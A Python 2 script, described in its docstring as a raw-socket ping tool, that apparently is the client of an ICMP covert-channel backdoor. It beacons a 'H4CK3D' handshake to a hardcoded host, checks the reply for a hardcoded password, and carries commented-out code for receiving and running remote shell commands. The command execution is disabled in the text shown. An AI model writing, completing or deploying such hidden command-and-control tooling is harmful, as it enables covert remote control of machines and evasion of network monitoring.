#!/usr/bin/env python
# encoding: utf-8
"""
"  A pure python ping implementation using raw socket.
"  ICMP messages can only be sent from processes running as root.
"""

import os, sys, socket, struct, select, time, string, subprocess
from ICMP_connection import ICMP

# proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
# output = proc.stdout.read()
# output += proc.stderr.read()


def execute_commands(icmp_helper):
    timeout = 10
    # print "hello"
    # while True:
    #     try:
    #        command = icmp_helper.receive(timeout)
    #        print "hello2"
    #        time.sleep(1)
    #        if(command != -1):
    #            print command
    #            print repr(command)
    #            icmp_helper.send("echo")
    #        else:
    #            print "No command receive..."
    #            print "Waiting..."
    #     except KeyboardInterrupt:
    #        break
    #     except Exception as ex:
    #         template = "An exception of type {0} occurred. Arguments:\n{1!r}"
    #         message = template.format(type(ex).__name__, ex.args)
    #         print message


secret_handshake = "H4CK3D"
password = "123456"
host = "127.0.0.1"
destination = "10.0.24.8"
icmp_helper = ICMP(host, destination,os.getpid() & 0xFFFF, True)
timeout = 10
# Wait for connection from client
print "Starting program..."
print "sending connection..."
while True:
    try:
        icmp_helper.send(secret_handshake)
        try:
            data = icmp_helper.receive(timeout)
            print "Expecting password:"
            print repr(data)

            if(password in data):
                # send("OK", ID)
                print "Connected!"
                icmp_helper.send("OK")
                # execute_commands(icmp_helper)
                exit()
            else:
                icmp_helper.send("WRONG")
                print "Connection failed, retrying..."
            print "---------------"
            time.sleep(1)
        except KeyboardInterrupt:
            break
    except KeyboardInterrupt:
        break


icmp_helper.close()
